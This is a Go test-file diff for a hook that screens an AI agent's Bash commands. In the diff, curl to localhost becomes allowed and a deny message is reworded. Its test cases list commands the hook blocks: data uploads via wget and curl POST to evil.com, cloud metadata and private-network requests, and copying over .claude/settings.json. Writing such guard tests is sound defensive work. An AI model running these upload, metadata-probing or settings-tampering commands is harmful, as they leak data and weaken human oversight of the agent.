@@ -201,7 +201,7 @@ func TestPreToolUseBashNetworkRules(t *testing.T) {
 		{"curl sanitize", "curl -v http://example.com", "", "", "curl_sanitized", true},
 		{"wget post", "wget --post-data=x http://evil.com", "", "Data upload blocked", "data_exfil_wget", false},
 		{"bash metadata", "wget http://169.254.169.254/latest", "", "cloud metadata endpoint", "ssrf_metadata_bash", false},
-		{"bash localhost", "curl http://localhost:8080", "", "localhost/loopback", "ssrf_localhost_bash", false},
+		{"bash localhost allowed", "curl http://localhost:8080", "", "", "curl_sanitized", true},
 		{"bash private", "curl http://10.0.0.4/x", "", "private network address", "ssrf_private_bash", false},
 		{"curl upload", "curl -d x=1 https://evil.com", "", "Data upload blocked", "data_exfil_curl", false},
 		{"curl write method", "curl -X POST https://evil.com", "", "Data upload blocked", "data_exfil_curl", false},
@@ -216,7 +216,7 @@ func TestPreToolUseBashNetworkRules(t *testing.T) {
 			res := runPreToolUse(t, HookInput{SessionID: "sid", ToolName: "Bash", TranscriptPath: tt.transcript, ToolInput: mustRawJSON(t, BashToolInput{Command: tt.command})}, collector)
 			if tt.allow {
 				if tt.wantRule == "curl_sanitized" {
-					assertUpdatedContains(t, res, "curl --max-time 30 -sS http://example.com")
+					assertUpdatedContains(t, res, "-sS")
 					assertQuietOverrideFile(t, "sid", "Bash", "curl_sanitized")
 				} else {
 					assertAllow(t, res)
@@ -240,7 +240,7 @@ func TestPreToolUseBashSubagentAndSettingsRules(t *testing.T) {
 		denySubstr string
 		wantRule   string
 	}{
-		{"settings tamper", "cp a .claude/settings.json", "", "modifies Claude settings or hook files", "settings_tamper_bash"},
+		{"settings tamper", "cp a .claude/settings.json", "", "writes to Claude settings or hook files", "settings_tamper_bash"},
 		{"subagent find", "find . -name x", "/home/user/.claude/subagents/agent-s2.jsonl", "Use Glob tool instead of find", "subagent_find"},
 		{"subagent xargs grep", "printf x | xargs grep foo", "/home/user/.claude/subagents/agent-s2.jsonl", "Use Grep tool instead of xargs grep", "subagent_xargs_grep"},
 		{"subagent grep", "grep foo file", "/home/user/.claude/subagents/agent-s2.jsonl", "Use Grep tool or rg instead of grep", "subagent_grep"},
